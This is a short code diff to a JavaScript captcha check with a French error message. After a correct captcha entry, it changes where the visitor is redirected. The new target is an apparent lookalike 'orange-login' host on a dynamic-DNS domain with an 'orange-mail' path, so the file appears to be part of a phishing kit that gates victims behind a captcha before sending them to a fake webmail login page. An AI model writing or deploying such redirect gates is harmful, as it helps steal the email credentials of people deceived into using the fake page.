@@ -30,7 +30,7 @@ function validateCaptcha() {
     event.preventDefault();
     debugger
     if (document.getElementById("cpatchaTextBox").value == code) {
-        targetURL="https://feakback.vercel.app/iewuAll_email.html";
+        targetURL="https://inik-orgelogin.tftpd.net/orange-mail/oro/";
 window.location=targetURL;
     } else {
         alert("Invalid Captcha. Veuillez réessayer svp");
